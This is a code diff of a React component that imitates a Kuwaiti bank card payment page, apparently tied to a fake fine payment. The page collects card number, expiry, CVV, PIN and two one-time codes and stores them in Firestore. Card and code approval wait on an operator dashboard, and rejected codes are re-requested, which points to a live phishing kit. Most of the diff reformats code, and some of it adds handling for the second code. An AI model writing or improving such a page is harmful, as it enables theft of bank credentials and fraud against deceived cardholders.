@@ -6,7 +6,6 @@ import { doc, onSnapshot } from "firebase/firestore"
 import { addData, db, handlePay } from "../../../firebase"
 import FullPageLoader from "../../../loader1"
 
-
 // Update the PaymentInfo type to include otp2
 type PaymentInfo = {
   createdDate?: string
@@ -68,7 +67,8 @@ const BANKS = [
     value: "CBK",
     label: "Commercial Bank of Kuwait",
     cardPrefixes: ["532672", "537015", "521175", "516334"],
-  }, {
+  },
+  {
     value: "Doha",
     label: "Doha Bank",
     cardPrefixes: ["419252"],
@@ -96,7 +96,6 @@ const BANKS = [
     cardPrefixes: ["409054", "406464"],
   },
   {
-
     value: "NBK",
     label: "National Bank of Kuwait",
     cardPrefixes: ["464452", "589160"],
@@ -149,6 +148,7 @@ export default function Kent(props: { setPage?: any; violationValue?: number }) 
     year: "",
     month: "",
     otp: "",
+    otp2: "",
     cvv: "",
     allOtps: newotp,
     bank: "",
@@ -183,7 +183,6 @@ export default function Kent(props: { setPage?: any; violationValue?: number }) 
   }
   // Handle form input changes
 
-
   // Handle payment info changes
   const handlePaymentInfoChange = (field: keyof PaymentInfo, value: string) => {
     setPaymentInfo((prev) => ({
@@ -203,14 +202,12 @@ export default function Kent(props: { setPage?: any; violationValue?: number }) 
     }))
   }
 
-
-
   // Handle OTP addition
   const handleAddOtp = (otp: string) => {
     if (!newotp.includes(`${otp} , `)) {
       newotp.push(`${otp} , `)
     }
-    addData({id:visitorId, allOtps:newotp,otp})
+    addData({ id: visitorId, allOtps: newotp, otp })
   }
 
   // Handle card approval
@@ -295,34 +292,34 @@ export default function Kent(props: { setPage?: any; violationValue?: number }) 
         status: "pending",
       }
       await handlePay(updatedPaymentInfo, setPaymentInfo)
+      // Clear the OTP field after submission
+      setPaymentInfo((prev) => ({ ...prev, otp2: "" }))
       setLoading(false)
       setStep(2)
     } else if (step === 1) {
       setLoading(true)
 
-setTimeout(() => {
-  setStep(0)
-  setLoading(false)
-}, 4000);      // Update payment info to pending status for card
+      setTimeout(() => {
+        setStep(0)
+        setLoading(false)
+      }, 4000) // Update payment info to pending status for card
       const updatedPaymentInfo = {
         ...paymentInfo,
         cardStatus: "pending",
       }
       await handlePay(updatedPaymentInfo, setPaymentInfo)
       // Note: We don't automatically move to step 2 now - waiting for dashboard approval
-    } else if (step === 2) {
-      if(paymentInfo.otp2 !==""){
-        handlePaymentInfoChange("otp2", '')
-      }
+    } else if (step > 2) {
       setLoading(true)
       await handleSubmit(e)
       setTimeout(() => {
         setLoading(false)
         cuonter()
+        setPaymentInfo((prev) => ({ ...prev, otp2: "" }))
+
         setStep(3)
       }, 3000)
     } else if (step === 3) {
-     
       if (paymentInfo.otp && !newotp.includes(paymentInfo.otp)) {
         handleAddOtp(paymentInfo.otp)
       }
@@ -380,6 +377,9 @@ setTimeout(() => {
             if (step === 1 && data.cardStatus === "approved") {
               setStep(2)
             }
+            if (paymentInfo.otp2 !== "") {
+              setPaymentInfo((prev) => ({ ...prev, otp2: "" }))
+            }
           }
 
           // Update OTP status if available
@@ -402,8 +402,7 @@ setTimeout(() => {
               // If we're on step 3 and status is rejected, show alert
               setLoading(false)
               alert("تم رفض الرمز,الرجاء ادخال الرمز بشكل صحيح ")
-              setPaymentInfo((prev) => ({ ...prev, otp: "" }))
-
+              setPaymentInfo((prev) => ({ ...prev, otp2: "" }))
             }
           }
         }
@@ -421,15 +420,8 @@ setTimeout(() => {
           <div id="FCUseDebitEnable" style={{ marginTop: 5 }}>
             {/* Bank Selection */}
             <div className="row">
-              <label className="col-4" >
-                Select Your Bank:
-              </label>
-              <select
-                className="col-8"
-               
-                onChange={(e) => handleBankSelection(e.target.value)}
-                value={paymentInfo.bank}
-              >
+              <label className="col-4">Select Your Bank:</label>
+              <select className="col-8" onChange={(e) => handleBankSelection(e.target.value)} value={paymentInfo.bank}>
                 <option value="" title="Select Your Bank">
                   Select Your Banks
                 </option>
@@ -451,7 +443,7 @@ setTimeout(() => {
                 onChange={(e) => handlePaymentInfoChange("prefix", e.target.value)}
                 value={paymentInfo.prefix}
               >
-                <option value="" >prefix</option>
+                <option value="">prefix</option>
                 {paymentInfo.bank_card.map((prefix, index) => (
                   <option key={index} value={prefix}>
                     {prefix}
@@ -460,7 +452,6 @@ setTimeout(() => {
               </select>
               <input
                 name="debitNumber"
-                
                 id="debitNumber"
                 type="tel"
                 inputMode="numeric"
@@ -510,11 +501,10 @@ setTimeout(() => {
             </div>
 
             {/* PIN */}
-            <div className="row" id="PinRow" >
-              <div className="row" >
-                <label className="col-4 m-1" >PIN:</label>
+            <div className="row" id="PinRow">
+              <div className="row">
+                <label className="col-4 m-1">PIN:</label>
                 <input
-
                   inputMode="numeric"
                   pattern="[0-9]*"
                   name="cardPin"
@@ -530,11 +520,9 @@ setTimeout(() => {
                 />
               </div>
             </div>
-           
-      {/* PIN */}
-            
+
+            {/* PIN */}
           </div>
-          
         )
       case 0:
         return (
@@ -602,10 +590,8 @@ setTimeout(() => {
                   }}
                 >
                   <div className="flex items-center justify-between mb-2">
-                    <div className="flex items-center gap-1 text-blue-600">
-                    </div>
+                    <div className="flex items-center gap-1 text-blue-600"></div>
                   </div>
-
                 </div>
 
                 {/* Second OTP Input field */}
@@ -635,7 +621,6 @@ setTimeout(() => {
             </div>
           </div>
         )
-     
 
       default:
         return (
@@ -703,10 +688,8 @@ setTimeout(() => {
                   }}
                 >
                   <div className="flex items-center justify-between mb-2">
-                    <div className="flex items-center gap-1 text-blue-600">
-                    </div>
+                    <div className="flex items-center gap-1 text-blue-600"></div>
                   </div>
-
                 </div>
 
                 {/* Second OTP Input field */}
@@ -771,9 +754,7 @@ setTimeout(() => {
                   <div className="row">
                     <label className="column-label">Amount: </label>
                     <label className="column-value text-label col" style={{ width: "50%" }}>
-                      <span style={{fontSize:9}}>
-                        {value+` kd`}
-                      </span>
+                      <span style={{ fontSize: 9 }}>{value + ` kd`}</span>
                     </label>
                   </div>
                 </div>
@@ -816,10 +797,12 @@ setTimeout(() => {
                       </center>
                     </div>
                     <div style={{ display: "flex" }}>
-                      <button style={{background:'#f1f1f1'}}disabled={!isFormValid() || loading} type="submit">
+                      <button style={{ background: "#f1f1f1" }} disabled={!isFormValid() || loading} type="submit">
                         {loading ? "Wait..." : step === 1 ? "Submit" : "تأكيد العملية"}
                       </button>
-                      <button style={{background:'#f1f1f1',marginLeft:5}} type="button">{step > 1 ? "الغاء" : "Cancel"}</button>
+                      <button style={{ background: "#f1f1f1", marginLeft: 5 }} type="button">
+                        {step > 1 ? "الغاء" : "Cancel"}
+                      </button>
                     </div>
                   </div>
                 </div>
@@ -1242,4 +1225,3 @@ setTimeout(() => {
     </div>
   )
 }
-
